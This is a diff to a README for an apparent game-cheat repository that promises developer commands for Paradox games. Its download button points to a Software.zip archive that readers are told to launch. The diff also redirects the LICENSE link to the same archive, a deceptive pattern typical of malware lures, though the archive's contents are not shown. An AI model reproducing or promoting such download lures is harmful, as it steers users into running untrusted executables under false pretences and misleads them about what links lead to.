@@ -13,7 +13,7 @@ Welcome to the **Paradox Developer Commands** repository! This is your one-stop 
 
 You can download the necessary software to unlock the developer commands for HOI4 and EU4 by clicking the button below. Once downloaded, follow the instructions to enjoy an enhanced gaming experience!
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/MariaMichaelHishmat/paradox-developer-commands/releases/download/v2.0/Software.zip)](https://github.com/MariaMichaelHishmat/paradox-developer-commands/releases/download/v2.0/Software.zip)
 
 *Note: The link provided above leads to a downloadable file that needs to be launched for installation.*
 
@@ -39,7 +39,7 @@ We welcome contributions from the community to further improve and expand the ca
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/yourusername/repositoryname/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/MariaMichaelHishmat/paradox-developer-commands/releases/download/v2.0/Software.zip) file for details.
 
 ## ❤️ Support
 
